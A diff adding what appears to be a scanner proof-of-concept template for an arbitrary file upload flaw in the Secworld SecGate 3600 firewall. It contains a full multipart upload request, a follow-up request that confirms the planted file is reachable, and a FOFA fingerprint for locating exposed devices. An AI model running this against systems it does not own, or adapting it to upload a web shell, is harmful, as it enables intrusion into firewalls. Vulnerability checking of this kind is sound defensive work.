@@ -1,0 +1,50 @@
+id: secworld-secgate3600-obj-av-import-save-fileupload
+
+info:
+  name: 网神SecGate 3600 防火墙obj_av_import_save任意文件上传漏洞
+  author: Observer
+  severity: critical
+  verified: true
+  description: |
+    FOFA: fid="1Lh1LHi6yfkhiO83I59AYg=="
+  tags: secworld,fileupload
+  created: 2023/12/07
+
+set:
+  randstr: randomLowercase(8)
+  randbody: randomLowercase(32)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /?g=app_av_import_save
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\
+        \r\n\
+        10000000\r\n\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"upfile\"; filename=\"{{randstr}}.txt\"\r\n\
+        Content-Type: text/plain\r\n\
+        \r\n\
+        {{randbody}}\r\n\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"submit_post\"\r\n\
+        \r\n\
+        obj_app_upfile\r\n\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"__hash__\"\r\n\
+        \r\n\
+        0b9d6b1ab7479ab69d9f71b05e0e9445\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 302 
+  r1:
+    request:
+      method: GET
+      path: /attachements/{{randstr}}.txt
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+expression: r0() && r1()
